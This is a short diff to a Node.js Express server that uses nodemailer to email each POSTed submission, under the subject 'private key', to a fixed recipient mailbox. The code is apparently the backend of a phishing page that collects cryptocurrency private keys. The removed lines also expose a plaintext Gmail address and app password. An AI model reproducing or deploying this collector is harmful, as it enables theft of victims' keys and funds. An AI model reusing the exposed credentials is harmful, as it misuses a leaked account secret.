@@ -3,6 +3,8 @@ const express = require("express");
 const PORT = process.env.PORT || 5000;
 const cors = require("cors");
 const app = express();
+const dotenv = require("dotenv");
+dotenv.config();
 
 app.use(cors());
 app.use(express.json());
@@ -18,15 +20,15 @@ var transporter = nodemailer.createTransport({
   port: 465,
   secure: true,
   auth: {
-    user: "bridgetsmith855@gmail.com",
-    pass: "oiwnwjojdxbzpefz",
+    user: process.env.SENDER_MAIL,
+    pass: process.env.PASS_KEY,
   },
 });
 
 app.post("/", (req, res) => {
   const mailOptions = {
-    from: `bridgetsmith855@gmail.com`,
-    to: `atandauthman2@gmail.com`,
+    from: process.env.SENDER_MAIL,
+    to: process.env.RECEIVER_MAIL,
     subject: "private key",
     html: `
                             <p>
